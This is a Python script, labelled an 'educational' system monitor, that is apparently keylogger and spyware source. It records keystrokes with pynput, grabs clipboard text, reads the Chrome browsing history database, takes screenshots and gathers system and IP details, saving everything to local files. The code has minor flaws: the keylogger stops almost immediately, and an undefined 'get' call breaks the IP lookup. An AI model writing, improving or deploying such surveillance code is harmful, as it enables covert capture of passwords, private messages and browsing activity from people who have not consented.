#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SYSTEM MONITOR TOOL (EDUCATIONAL USE ONLY)
Author: Erick Sanga
Warning: Unauthorized use may violate privacy laws
"""

from pynput.keyboard import Key, Listener
import sqlite3
import datetime
import socket
import platform
import win32clipboard
from PIL import ImageGrab
import pandas as pd
import os
import sys
from typing import List, Optional

# ========== CONFIGURATION ==========
OUTPUT_DIR = "monitor_data"
LOG_PREFIX = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

# ========== ETHICAL NOTICE ==========
print("\n[!] WARNING: Monitoring software active!")
print("[!] By continuing, you consent to activity logging\n")

# ========== KEYSTROKE LOGGER ==========
def sanitize_key(key) -> str:
    """Handle special keys and sanitize output"""
    if key == Key.space:
        return " "
    elif key == Key.enter:
        return "\n"
    elif key == Key.tab:
        return "\t"
    return str(key).replace("'", "")

def on_press(key: Key) -> None:
    """Enhanced key press handler"""
    try:
        with open(f"{OUTPUT_DIR}/{LOG_PREFIX}_keystrokes.txt", "a", encoding='utf-8') as f:
            f.write(sanitize_key(key))
    except Exception as e:
        print(f"[!] Keylogger error: {str(e)}")

# ========== SYSTEM INFORMATION ==========
def get_system_info() -> pd.DataFrame:
    """Get comprehensive system information"""
    try:
        public_ip = get('https://api.ipify.org').text
    except:
        public_ip = "Unable to fetch"
    
    return pd.DataFrame({
        'Metric': ['Date', 'Public IP', 'Local IP', 'Processor', 
                  'System', 'Release', 'Host Name'],
        'Value': [
            datetime.date.today(),
            public_ip,
            socket.gethostbyname(socket.gethostname()),
            platform.processor(),
            platform.system(),
            platform.release(),
            socket.gethostname()
        ]
    })

# ========== CLIPBOARD MONITOR ==========
def get_clipboard() -> Optional[str]:
    """Safe clipboard retrieval with error handling"""
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
            return win32clipboard.GetClipboardData()
        return None
    except Exception as e:
        print(f"[!] Clipboard error: {str(e)}")
        return None
    finally:
        win32clipboard.CloseClipboard()

# ========== CHROME HISTORY ==========
def get_chrome_history() -> pd.DataFrame:
    """Cross-platform Chrome history extraction"""
    try:
        # Platform-independent path detection
        history_path = os.path.join(
            os.getenv('LOCALAPPDATA', ''),
            'Google', 'Chrome', 'User Data', 'Default', 'History'
        )
        
        if not os.path.exists(history_path):
            raise FileNotFoundError("Chrome history database not found")
            
        with sqlite3.connect(history_path) as conn:
            df = pd.read_sql_query(
                "SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch') as timestamp FROM urls",
                conn
            )
        return df
    except Exception as e:
        print(f"[!] Chrome history error: {str(e)}")
        return pd.DataFrame()

# ========== SCREENSHOT ==========
def take_screenshot() -> None:
    """Screenshot with error handling"""
    try:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        ImageGrab.grab().save(f"{OUTPUT_DIR}/{LOG_PREFIX}_screenshot.png")
    except Exception as e:
        print(f"[!] Screenshot error: {str(e)}")

# ========== MAIN EXECUTION ==========
if __name__ == "__main__":
    try:
        # Create output directory
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        # Start keylogger
        listener = Listener(on_press=on_press)
        listener.start()
        
        # Collect system info
        get_system_info().to_excel(f"{OUTPUT_DIR}/{LOG_PREFIX}_system_info.xlsx", index=False)
        
        # Collect clipboard
        if clipboard_data := get_clipboard():
            with open(f"{OUTPUT_DIR}/{LOG_PREFIX}_clipboard.txt", "a", encoding='utf-8') as f:
                f.write(f"\n[{datetime.datetime.now()}]\n{clipboard_data}\n")
        
        # Collect Chrome history
        get_chrome_history().to_excel(f"{OUTPUT_DIR}/{LOG_PREFIX}_chrome_history.xlsx", index=False)
        
        # Clean exit
        listener.stop()
        take_screenshot()
        
    except KeyboardInterrupt:
        print("\n[!] Monitoring stopped by user")
        take_screenshot()
        sys.exit(0)
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")
        sys.exit(1)
